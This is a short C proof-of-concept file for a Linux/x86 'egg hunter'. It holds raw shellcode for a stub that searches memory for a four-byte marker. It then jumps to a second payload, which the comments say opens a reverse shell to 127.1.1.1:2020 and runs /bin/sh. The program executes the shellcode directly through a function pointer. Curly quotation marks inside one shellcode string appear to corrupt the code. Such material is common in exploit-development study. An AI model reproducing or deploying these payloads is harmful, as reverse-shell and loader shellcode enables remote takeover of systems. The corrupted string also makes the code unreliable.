/*
 Title: Linux/x86 Egg Hunter code - POC

 */

 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>

 #define EGG "\x78\x78\x78\x78"        // the EGG, here: "xxxx"

 int main()
 {
 char egghunter[50] = \
 "\x31\xd2\x66\x81\xca\xff\x0f\x42\x31\xc9\x89\xd3\x6a\x21\x58\xcd"
 "\x80\x3c\xf2\x74\xed\x89\xd7\xb8” EGG “\xaf\x75\xe8\xaf\x75\xe5\xff\xe7";

 // start with the double-egg to be found by egghunter()
 // then a reverse shell to 127.1.1.1:2020 is executed
 char shellcode[100] = \
 EGG EGG "\x6a\x66\x58\x31\xd2\x52\x42\x52\x89\xd3\x42\x52\x89\xe1"
 "\xcd\x80\x89\xc3\x89\xd1\xb0\x3f\xcd\x80\x49\x79\xf9\x87\xda\x68"
 "\x7f\x01\x01\x01\x66\x68\x07\xe4\x66\x53\x89\xe1\xb0\x66\x43\x6a"
 "\x10\x51\x52\x89\xe1\xcd\x80\xb0\x0b\x99\x89\xd1\x52\x68\x6e\x2f"
 "\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xcd\x80";

 printf("Egghunter: %d bytes\n", strlen(egghunter));
 printf("Shellcode address in memory: %p\n", shellcode);
 printf("Shellcode: %d bytes\n", strlen(shellcode)-8);     //substract the double-egg size

 int (*ret)() = (int(*)())egghunter; 
 ret();
 }
